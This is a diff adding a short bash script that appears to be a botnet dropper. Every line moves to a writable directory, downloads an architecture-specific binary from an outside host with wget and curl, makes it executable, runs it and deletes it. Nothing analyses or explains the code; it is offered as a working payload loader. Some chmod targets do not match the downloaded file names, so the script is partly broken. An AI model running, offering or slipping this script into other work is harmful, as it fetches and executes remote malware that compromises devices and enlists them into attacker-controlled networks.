@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsAm.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsAm.TELNET; chmod +x 8UsAm; ./8UsAm.TELNET; rm -rf 8UsAm.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsAml.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsAml.TELNET; chmod +x 8UsAml; ./8UsAml.TELNET; rm -rf 8UsAml.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsAsh.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsAsh.TELNET; chmod +x 8UsAsh; ./8UsAsh.TELNET; rm -rf 8UsAsh.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsA64.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsA64.TELNET; chmod +x 8UsA64; ./8UsA64.TELNET; rm -rf 8UsA64.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsA6.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsA6.TELNET; chmod +x 8UsA6; ./8UsA6.TELNET; rm -rf 8UsA6.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsA68.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsA68.TELNET; chmod +x 8UsA68; ./8UsA68.TELNET; rm -rf 8UsA68.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsApc.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsApc.TELNET; chmod +x 8UsApc; ./8UsApc.TELNET; rm -rf 8UsApc.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsA58.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsA58.TELNET; chmod +x 8UsA58; ./8UsA58.TELNET; rm -rf 8UsA58.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsAk68.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsAk68.TELNET; chmod +x 8UsAk68; ./8UsAk68.TELNET; rm -rf 8UsAk68.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsAsc.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsAsc.TELNET; chmod +x 8UsAsc; ./8UsAsc.TELNET; rm -rf 8UsAsc.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsA4.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsA4.TELNET; chmod +x 8UsA4; ./8UsA4.TELNET; rm -rf 8UsA4.TELNET
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://torah-net.purplexuscraft.com/8UsA5.TELNET; curl -O http://torah-net.purplexuscraft.com/8UsA5.TELNET; chmod +x 8UsA5; ./8UsA5.TELNET; rm -rf 8UsA5.TELNET
